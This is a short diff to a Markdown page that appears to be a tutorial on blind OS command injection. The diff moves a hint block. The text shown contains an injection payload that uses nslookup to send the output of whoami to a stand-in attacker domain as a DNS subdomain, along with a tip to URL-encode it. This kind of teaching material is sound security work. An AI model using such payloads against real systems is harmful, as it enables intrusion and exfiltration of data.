@@ -31,9 +31,6 @@ Once we’ve confirmed blind OS command injection, we can exfiltrate the output 
 
 {% hint style="info" %}
 💡 The out-of-band channel provides an easy way to exfiltrate the output from injected commands:
-{% endhint %}
-
-
 
 ```bash
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
@@ -44,6 +41,9 @@ This causes a DNS lookup to the attacker's domain containing the result of the `
 ```bash
 wwwuser.kgji2ohoyw.web-attacker.com
 ```
+
+{% endhint %}
+
 
 Add the output of `whoami` as subdomain to the domain name provided but Burp Collaborator and send the request. URLencode the payload to avoid breaking the request.
 
